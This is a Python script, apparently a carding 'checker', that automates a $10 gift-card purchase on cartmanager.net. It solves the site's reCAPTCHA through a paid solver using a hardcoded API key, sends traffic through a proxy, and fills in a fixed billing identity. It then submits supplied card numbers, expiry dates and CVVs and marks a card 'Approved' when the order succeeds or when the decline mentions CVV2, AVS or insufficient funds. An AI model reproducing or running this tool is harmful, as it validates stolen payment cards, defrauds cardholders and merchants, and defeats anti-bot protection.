import asyncio
import capsolver
import uuid
from httpx import AsyncClient

async def paeyezy(cc, mes, ano, cvv, proxyg):
    try:
        async with AsyncClient(proxy=proxyg) as web:
            email = str(uuid.uuid4()) + '@gmail.com'
            
            capsolver.api_key = "CAP-19CE2290C6A6349E52AE1488B65DCCB7"
                
            g_response = (await asyncio.to_thread(lambda: capsolver.solve({
            "type": "ReCaptchaV2TaskProxyLess",
            "websiteKey": '6LftZFUUAAAAAMzRlg3_p0lLJ9CqOT92JzovFXrS',
            "websiteURL": 'https://www.cartmanager.net/',
            })))['gRecaptchaResponse']

            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            req1 = await web.get('https://www.cartmanager.net/cgi-bin/cart.cgi?AddItem101=groceryoutlet|Grocery%20Outlet%20Gift%20Card|10|1|101|0|Free%20Shipping|0|||||||giftcard.jpg;ViewCart=1',headers=headers,)
            print(req1.text)
            idtoken = req1.text.split('type=hidden name=id value="')[1].split('"')[0]
            print(idtoken)

            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.cartmanager.net',
                'Referer': 'https://www.cartmanager.net/cgi-bin/cart.cgi?AddItem101=groceryoutlet|Grocery%20Outlet%20Gift%20Card|10|1|101|0|Free%20Shipping|0|||||||giftcard.jpg;ViewCart=1',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            params = {
                'id': idtoken,
            }

            data = {
                'id': idtoken,
                'ViewCart': '1',
                'CheckOut': 'OnlineOrder',
                'Check Out.x': '93',
                'Check Out.y': '10',
            }
            req2 = await web.post('https://www.cartmanager.net/cgi-bin/cart.cgi', params=params, headers=headers, data=data)
            idtoken = req2.text.split('type=hidden name=id value="')[1].split('"')[0]
            print(idtoken)
            
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.cartmanager.net',
                'Referer': f'https://www.cartmanager.net/cgi-bin/cart.cgi?id={idtoken}',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            data = {
                'id': idtoken,
                'CheckOut': 'OnlineOrder',
                'action': 'SetUserID',
                'Ecom_BillTo_Postal_First_Name': 'Sebastian',
                'Ecom_BillTo_Postal_Last_Name': 'Gutierrez',
                'Ecom_BillTo_Postal_Street_Line1': '103-105 Central Avenue',
                'Ecom_BillTo_Postal_Street_Line2': '',
                'Ecom_BillTo_Postal_City': 'Orange',
                'Ecom_BillTo_Postal_State': 'NJ',
                'Ecom_BillTo_Postal_PostalCode': '07050-3824',
                'Ecom_BillTo_Postal_Country': 'Estados Unidos',
                'Ecom_BillTo_Telecom_Phone_Number': '5059947000',
                'Ecom_BillTo_Telecom_Phone_Number_2': '',
                'Ecom_BillTo_Telecom_Fax': '',
                'Ecom_BillTo_Online_Email': email,
                'Ecom_ShipTo_Postal_First_Name': 'Sebastian',
                'Ecom_ShipTo_Postal_Last_Name': 'Gutierrez',
                'Ecom_ShipTo_Postal_Street_Line1': '103-105 Central Avenue',
                'Ecom_ShipTo_Postal_Street_Line2': '',
                'Ecom_ShipTo_Postal_City': 'Orange',
                'Ecom_ShipTo_Postal_State': 'NJ',
                'Ecom_ShipTo_Postal_PostalCode': '07050-3824',
                'Ecom_ShipTo_Postal_Country': 'Estados Unidos',
                'Ecom_ShipTo_Telecom_Phone_Number': '5059947000',
                'Ecom_ShipTo_Telecom_Phone_Number_2': '',
                'Ecom_ShipTo_Telecom_Fax': '',
                'Ecom_ShipTo_Online_Email': email,
                'SameAsShipping': '    Continue    ',
            }

            req3 = await web.post('https://www.cartmanager.net/cgi-bin/cart.cgi', headers=headers, data=data)
            
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
                'Cache-Control': 'no-cache',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.cartmanager.net',
                'Referer': 'https://www.cartmanager.net/cgi-bin/cart.cgi',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            data = {
                'init': '1',
                'id': idtoken,
                'CheckOutComplete': 'OnlineOrder',
                'METHOD': 'Visa',
                'GrandTotalMinimum': '',
                'AMOUNT': '10.00',
                'Ecom_Payment_Card_Number': cc,
                'Ecom_Payment_Card_Verification': cvv,
                'Ecom_Payment_Card_ExpDate_Month': mes,
                'Ecom_Payment_Card_ExpDate_Year': ano,
                'SpecialOrderInstructions': '',
                'g-recaptcha-response': g_response,
                'SubmitOrder': 'Submit Order',
            }

            req4 = await web.post('https://www.cartmanager.net/cgi-bin/cart.cgi', headers=headers, data=data)
            if "Order Receipt" in req4.text:
                status = "Approved ✅"
                mensaje = "Charged $10"
            else:
                mensaje = req4.text.split('<UL>')[1].split('</UL>')[0].replace('<LI>', '')
                if "CVV2" in mensaje:
                    status = "Approved ✅"
                elif "Insufficient funds" in mensaje:
                    status = "Approved ✅"
                elif "AVS" in mensaje:
                    status = "Approved ✅"
                else:
                    status = "Declined ❌"
            return status, mensaje
    except Exception as e:
        status = "Error ⚠️"
        mensaje = f"Error en la línea {e.__traceback__.tb_lineno}: {str(e)}"
        return status, mensaje